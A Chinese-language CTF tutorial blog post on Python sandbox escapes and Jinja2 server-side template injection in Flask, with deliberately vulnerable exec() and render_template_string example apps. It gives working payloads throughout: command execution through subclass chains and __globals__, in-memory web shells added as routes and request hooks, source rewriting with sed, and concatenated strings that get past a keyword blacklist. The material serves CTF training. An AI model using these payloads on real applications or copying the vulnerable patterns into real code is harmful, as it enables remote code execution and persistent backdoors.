---
title: python沙箱与ssti入门
date: 2025-03-11 19:49:28
tags: 
  - ctf
  - python
categories:
  - 技术
  - ctf
  - web
toc: true
comments: true
---

# python沙箱与ssti(jinja2)入门------精简版

完整版云文档: https://doc.weixin.qq.com/doc/w3_AV4A0QaYAIoYb700En5SsqbaVhU4l?scode=APUACwdKABEAMrANAQAV4A0QaYAIo&version=4.1.32.6005&platform=win

题目练习场：https://ctf.xidian.edu.cn/training/

## python沙箱

沙箱环境是通过控制和限制代码的执行，保护系统免受恶意代码的危害。在 Flask 应用中，可能会通过如 `exec()`、`eval()` 或者其他动态执行代码的方式创建沙箱。这样的操作可能使得恶意用户能够通过注入代码进行远程代码执行 (RCE)。

### 题目：python沙箱1

```python
from flask import *

app = Flask(__name__)
@app.route('/rce', methods=['GET', 'POST'])
def rce():
    if request.method == 'POST':
        code = request.form['code']
        exec(code) #换成eval()呢？
    return render_template('rce.html')

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)

#思考：要是没有static目录，怎么办？
```

沙箱里有globals()的全局变量与函数

#### 1.写静态目录 

```python
import os;os.system('ls >static/1') 
__import__('os').system('')#eval时适用
```

```python
#Fifker
import os
with open("static/test.txt",'w') as f:
	f.write(os.popen('dir').read())
```

如果没static会写入失败，这时候可以先 `mkdir static ; ls >static/1.txt`

#### 2.写templates/rce.html模板文件

#### 3.写app.py热加载

```python
__import__('os').system("sed -i \"s/rce.html/`cat /f*`/\" rce.py")
```

#### 4.打内存马

```python
app._got_first_request=False;app.add_url_rule('/shell','shel1',lambda:'<pre>{0}</pre>'.format(__import__('os').popen(request.args.get('cmd')).read()))

app.before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen('').read())

app.after_request_funcs.setdefault(None, []).append(lambda x: y if exec('import os;global y;y=make_response(os.popen("dir").read())')==None else x)
```

#### 5.利用沙箱中函数的\_\_globals\_\_属性获取\_\_builtins\_\_

```python
ur1_for.__globals__['__builtins__']['eval']
```

```python
get_flashed_messages,lipsum.......
```

```python
ur1_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None,[])append(lambda resp:CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import __(\'os\').popen(request.args.get(\'cmd\'))read())\")==None else resp)",{'request':ur1_for.__globals__['request'],'app':ur1_for.__g1obals__['sys'].modules['__main__'].__dict__['app']})
```

#### 6.利用继承关系逃逸

```python
 for i in ''.__class__.__base__.__subclasses__():
     c+=1
     if 'wrapper' not in str(i.__init__):
         print(c)
        #找非wrapper的init函数
```

```python
''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['eval']("''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['__import__']('os').popen('dir').read()")
```

**os._wrap_close**在os.py里定义，他的init函数globals属性获取到的全局变量与函数包括在os.py里定义的，有system,popen

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("")
```

**warnings.catch_warnings**类在在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__(很多模块都包含builtins吧)

```python
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']("os").system("cat ../flag templates/rce.html")
```

#### 7.复写函数

```python
global render_template;render_template=lambda x:__import__('os').popen('').read()
```

### 题目：python沙箱2

```python
from flask import *
app = Flask(__name__)


@app.route('/rce', methods=['GET', 'POST'])
def rce():
    if request.method == 'POST':
        code = request.form['code']
        restricted_globals = {
             '__builtins__': {},
        }
        exec(code, restricted_globals)
    return render_template('rce.html')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

沙箱里没有全局变量全局函数（builtin的，flask的都没），利用继承关系逃逸

## python ssti

![image-20250118152124960](C:\Users\tiand\AppData\Roaming\Typora\typora-user-images\image-20250118152124960.png)

SSTI 是指通过模板引擎（如 Jinja2）执行恶意模板语法，从而导致远程代码执行的漏洞。在 Flask 中，Jinja2 是默认的模板引擎，它的语法允许动态生成 HTML 内容，但不当使用时可能被攻击者利用。

### 查看flask的jinja2沙箱中globals(全局变量与全局函数)

```python
from flask import Flask

app = Flask(__name__)


@app.route('/')
def index():
    jinja_globals = app.jinja_env.globals

    print(jinja_globals)
    return "jinja_globals"
#获取沙箱中全局变量全局函数

if __name__ == '__main__':
    app.run(debug=True)
```

```json
{'range': <class 'range'>, 
'dict': <class 'dict'>, 
'lipsum': <function generate_lorem_ipsum at 0x000002049AACD800>, 
'cycler': <class 'jinja2.utils.Cycler'>, 
'joiner': <class 'jinja2.utils.Joiner'>, 
'namespace': <class 'jinja2.utils.Namespace'>, 
'url_for': <bound method Flask.url_for of <Flask 'test'>>, 
'get_flashed_messages': <function get_flashed_messages at 0x000002049B62F740>, 

'config': <Config {'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 		   'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>, 

'request': <Request 'http://127.0.0.1:5000/' [GET]>, 
'session': <NullSession {}>, 
'g': <flask.g of 'test'>}
```

### 查看flask的jinja2沙箱中过滤器

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    jinja_filters = app.jinja_env.filters
    
    print(jinja_filters)
    return "jinja_filters"
#获取可用过滤器
if __name__ == '__main__':
    app.run(debug=True)
```

```json
{'abs': <built-in function abs>, 
 'attr': <function do_attr at 0x00000216DF1E0180>, 
 'batch': <function do_batch at 0x00000216DF1DAE80>, 
 'capitalize': <function do_capitalize at 0x00000216DF1D99E0>, 
 'center': <function do_center at 0x00000216DF1DA020>, 
 'count': <built-in function len>, 'd': <function do_default at 0x00000216DF1D9EE0>, 
 'default': <function do_default at 0x00000216DF1D9EE0>, 
 'dictsort': <function do_dictsort at 0x00000216DF1D9B20>, 
 'e': <built-in function escape>, 'escape': <built-in function escape>, 
 'filesizeformat': <function do_filesizeformat at 0x00000216DF1DA660>, 
 'first': <function do_first at 0x00000216DF1DA520>, 
 'float': <function do_float at 0x00000216DF1DAB60>, 
 'forceescape': <function do_forceescape at 0x00000216DF1D9580>, 
 'format': <function do_format at 0x00000216DF1DAC00>, 
 'groupby': <function do_groupby at 0x00000216DF1DB880>, 
 'indent': <function do_indent at 0x00000216DF1DA840>, 
 'int': <function do_int at 0x00000216DF1DAAC0>, 
 'join': <function do_join at 0x00000216DF1DA200>, 
 'last': <function do_last at 0x00000216DF1DA340>, 
 'length': <built-in function len>, 
 'list': <function do_list at 0x00000216DF1DBD80>, 
 'lower': <function do_lower at 0x00000216DF1D9800>, 
 'items': <function do_items at 0x00000216DF1D98A0>, 
 'map': <function do_map at 0x00000216DF1E0860>, 
 'min': <function do_min at 0x00000216DF1D9DA0>, 
 'max': <function do_max at 0x00000216DF1D9E40>, 
 'pprint': <function do_pprint at 0x00000216DF1DA700>, 
 'random': <function do_random at 0x00000216DF1DA5C0>, 
 'reject': <function do_reject at 0x00000216DF1E0D60>, 
 'rejectattr': <function do_rejectattr at 0x00000216DF1E1260>, 
 'replace': <function do_replace at 0x00000216DF1D96C0>, 
 'reverse': <function do_reverse at 0x00000216DF1E00E0>, 
 'round': <function do_round at 0x00000216DF1DB100>, 
 'safe': <function do_mark_safe at 0x00000216DF1DBBA0>, 
 'select': <function do_select at 0x00000216DF1E0AE0>, 
 'selectattr': <function do_selectattr at 0x00000216DF1E0FE0>, 
 'slice': <function do_slice at 0x00000216DF1DB060>, 
 'sort': <function do_sort at 0x00000216DF1D9BC0>, 
 'string': <built-in function soft_str>, 
 'striptags': <function do_striptags at 0x00000216DF1DAD40>, 
 'sum': <function do_sum at 0x00000216DF1DBB00>, 
 'title': <function do_title at 0x00000216DF1D9A80>, 
 'trim': <function do_trim at 0x00000216DF1DACA0>, 
 'truncate': <function do_truncate at 0x00000216DF1DA8E0>, 
 'unique': <function do_unique at 0x00000216DF1D9C60>, 
 'upper': <function do_upper at 0x00000216DF1D9760>, 
 'urlencode': <function do_urlencode at 0x00000216DF1D9620>, 
 'urlize': <function do_urlize at 0x00000216DF1DA7A0>, 
 'wordcount': <function do_wordcount at 0x00000216DF1DAA20>, 
 'wordwrap': <function do_wordwrap at 0x00000216DF1DA980>, 
 'xmlattr': <function do_xmlattr at 0x00000216DF1D9940>, 
 'tojson': <function do_tojson at 0x00000216DF1E1080>}
```

### 题目：python ssti1

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/ssti', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form['name']
        str = f'<h1>{name} is sb</h1>'
    return render_template_string(str)
    #没回显怎么办(比如最后一句换成)
    #render_template_string(str)
    #return 'success'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

```
{{url_for.__globals__.__builtins__['eval']("__import__('os').popen('dir').read()")}}
```

### 题目：python ssti2

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)
@app.post('/ssti')
def index():
    if request.method == 'POST':
        name = request.form['name']
        blacklist = ['__','builtin','globals','app','url_for','get_flashed_messages','lipsum','init','os']
        if any(i in name for i in blacklist):
            return '滚丫'
        str = f'<h1>{name} is sb</h1>'
        return render_template_string(str)
        #没回显怎么办(比如最后一句换成)
        #render_template_string(str)
        #return 'success'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

```
{{request["_"+'_ini'+'t_'+'_']['_'+"_global"+"s_"+"_"]["_"+"_built"+"ins_"+"_"]["eval"]("_"+"_import_"+"_('o"+"s').popen('dir').read()")}}
```

其他的payload自由发挥，基本根据黑名单的不同而变化

**黑名单绕过** 

简单来说就是用等价形式代替

https://chenlvtang.top/2021/03/31/SSTI%E8%BF%9B%E9%98%B6/

https://blog.csdn.net/miuzzx/article/details/110220425